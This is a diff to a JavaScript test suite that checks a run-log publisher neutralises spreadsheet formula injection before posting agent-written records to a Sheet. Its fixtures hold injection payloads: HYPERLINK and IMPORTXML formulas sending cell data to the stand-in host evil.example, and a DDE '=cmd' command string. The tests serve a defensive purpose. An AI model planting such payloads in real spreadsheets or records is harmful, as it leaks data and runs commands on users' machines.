@@ -729,6 +729,38 @@ test("publish: a run that changed no code (no PR, a successful exit) is still lo
   } finally { cleanup(w); }
 });
 
+// B2: plan_title is agent-written. A cell starting with = + - @ (or a tab/CR) is a formula in the
+// Sheet, so publish prefixes such strings with ' before posting; everything else stays as it was.
+test("publish: formula-leading strings in the record are neutralised before they reach the Sheet", () => {
+  const base = JSON.parse(writeRunLogRecord());
+  const hostile = {
+    "=HYPERLINK(\"https://evil.example/?d=\"&A1,\"x\")": "'=HYPERLINK(\"https://evil.example/?d=\"&A1,\"x\")",
+    "+IMPORTXML(\"https://evil.example\",\"//a\")": "'+IMPORTXML(\"https://evil.example\",\"//a\")",
+    "-2+3": "'-2+3",
+    "@SUM(1)": "'@SUM(1)",
+    "\t=1+1": "'\t=1+1",
+    "\r=1+1": "'\r=1+1",
+  };
+  for (const [title, expected] of Object.entries(hostile)) {
+    const rec = JSON.stringify({ ...base, plan_title: title, actor: "=cmd|' /C calc'!A0" });
+    const w = world({ log: rec });
+    try {
+      publish(w, { RUN_LOG_SHEET_WEBHOOK: HOOK });
+      const calls = sheetCalls(w.root);
+      assert.equal(calls.length, 1, JSON.stringify(title));
+      const sent = JSON.parse(dataOf(calls[0]));
+      assert.equal(sent.plan_title, expected, JSON.stringify(title));
+      assert.equal(sent.actor, "'=cmd|' /C calc'!A0"); // every string, not only plan_title
+      // everything else is untouched: same keys, numbers stay numbers
+      assert.deepEqual(Object.keys(sent), Object.keys(base));
+      assert.deepEqual({ ...sent, plan_title: base.plan_title, actor: base.actor }, base);
+      assert.equal(typeof sent.total_cost_usd, "number");
+      // the record committed to the branch is the agents' original; only the Sheet copy changes
+      assert.equal(sh(w.remote, "git", ["show", "factory/run-1:.factory/runs/run-1.json"]).trim(), rec);
+    } finally { cleanup(w); }
+  }
+});
+
 test("publish: a Sheet that rejects the record does not fail the run, and is not marked as logged", () => {
   const w = world({ log: writeRunLogRecord() });
   try {
@@ -787,7 +819,9 @@ test("notify-failure: a failed run gets a Sheet row built only from workflow val
   assert.equal(row.test_result, "none");
   assert.equal(row.review_verdict, "unknown");
   assert.equal(row.plan_title, "(run failed: agent job failure)");
-  assert.equal(row.num_turns, 0);
+  // turns and cost are unknown here: null ("unknown" in the Sheet), never 0, which would under-report spend
+  assert.equal(row.num_turns, null);
+  assert.equal(row.total_cost_usd, null);
   // same brief identity run-log.mjs would compute (sha256 of the trimmed brief, 12 hex), never the text
   assert.equal(row.brief_sha256, createHash("sha256").update(brief.trim()).digest("hex").slice(0, 12));
   assert.equal(row.brief_chars, brief.trim().length);
